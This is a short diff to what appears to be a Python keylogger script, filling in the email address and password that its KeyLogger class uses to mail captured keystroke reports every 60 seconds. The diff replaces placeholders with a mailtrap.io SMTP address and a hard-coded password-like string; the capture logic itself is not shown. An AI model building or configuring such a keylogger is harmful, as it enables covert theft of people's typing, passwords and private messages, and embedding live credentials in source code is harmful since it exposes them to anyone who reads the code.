@@ -22,8 +22,8 @@ except ModuleNotFoundError:
 
 
 finally:
-    EMAIL_ADDRESS = "YOUR_USERNAME"
-    EMAIL_PASSWORD = "YOUR_PASSWORD"
+    EMAIL_ADDRESS = "smtp@mailtrap.io"
+    EMAIL_PASSWORD = "0561cfcbd17be0c5dc1e8a3a1ea9f1f9"
     SEND_REPORT_EVERY = 60 # as in seconds
     class KeyLogger:
         def __init__(self, time_interval, email, password):
